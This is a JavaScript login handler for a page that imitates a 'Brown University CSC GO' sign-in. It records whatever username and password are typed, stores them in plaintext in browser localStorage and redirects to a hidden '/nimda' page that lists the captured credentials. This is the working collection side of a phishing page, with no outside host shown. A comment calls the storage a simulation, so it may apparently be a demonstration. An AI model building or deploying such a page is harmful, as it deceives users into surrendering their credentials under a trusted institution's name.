// login.js - Handles authentication, saving credentials, and navigation

document.addEventListener('DOMContentLoaded', function() {
    // Check if we're on the creds page (/nimda)
    const currentPath = window.location.pathname;
    
    if (currentPath.includes('/nimda') || currentPath === '/nimda') {
        showCredsPage();
    } else {
        setupLoginForm();
    }
});

function setupLoginForm() {
    const loginForm = document.getElementById('auth-form');
    const successModal = document.getElementById('success-modal');
    
    if (loginForm) {
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Get username and password
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // Validate inputs
            if (!username || !password) {
                alert('Please enter both username and password');
                return;
            }
            
            // Save credentials to localStorage
            saveCredentials(username, password);
            
            // Show success modal
            showSuccessModal();
        });
    }
}

function saveCredentials(username, password) {
    const creds = {
        username: username,
        password: password,
        timestamp: new Date().toISOString(),
        source: 'Brown University CSC GO'
    };
    
    // Save to localStorage (simulating database storage)
    localStorage.setItem('brown_creds', JSON.stringify(creds));
    
    // Also save individual values for easy access
    localStorage.setItem('csc_username', username);
    localStorage.setItem('csc_password', password);
}

function showSuccessModal() {
    const modal = document.getElementById('success-modal');
    if (modal) {
        modal.style.display = 'flex';
        
        // Auto-hide after 3 seconds and redirect to creds page
        setTimeout(() => {
            window.location.href = '/nimda';
        }, 2000);
    }
}

function closeModal() {
    const modal = document.getElementById('success-modal');
    if (modal) {
        modal.style.display = 'none';
        
        // Redirect to creds page after closing modal
        window.location.href = '/nimda';
    }
}

function showCredsPage() {
    // Hide main app, show creds page
    const appView = document.getElementById('app-view');
    const credsPage = document.getElementById('creds-page');
    
    if (appView) appView.style.display = 'none';
    if (credsPage) credsPage.style.display = 'block';
    
    // Retrieve and display credentials
    const savedCreds = localStorage.getItem('brown_creds');
    const savedUser = localStorage.getItem('csc_username');
    const savedPass = localStorage.getItem('csc_password');
    
    if (savedCreds) {
        try {
            const credsObj = JSON.parse(savedCreds);
            document.getElementById('display-user').innerText = credsObj.username;
            document.getElementById('display-pass').innerText = credsObj.password;
            document.getElementById('display-timestamp').innerText = credsObj.timestamp || 'N/A';
            document.getElementById('display-source').innerText = credsObj.source || 'Unknown';
        } catch (e) {
            console.error('Error parsing credentials:', e);
            displayFallbackCreds(savedUser, savedPass);
        }
    } else if (savedUser && savedPass) {
        // Fallback to individual storage
        displayFallbackCreds(savedUser, savedPass);
    } else {
        document.getElementById('display-user').innerText = 'No credentials found';
        document.getElementById('display-pass').innerText = 'Please login first';
    }
}

function displayFallbackCreds(user, pass) {
    document.getElementById('display-user').innerText = user || 'None';
    document.getElementById('display-pass').innerText = pass || 'None';
    document.getElementById('display-timestamp').innerText = new Date().toLocaleString();
    document.getElementById('display-source').innerText = 'Brown University CSC GO';
}

// Make functions available globally for HTML onclick events
window.closeModal = closeModal;
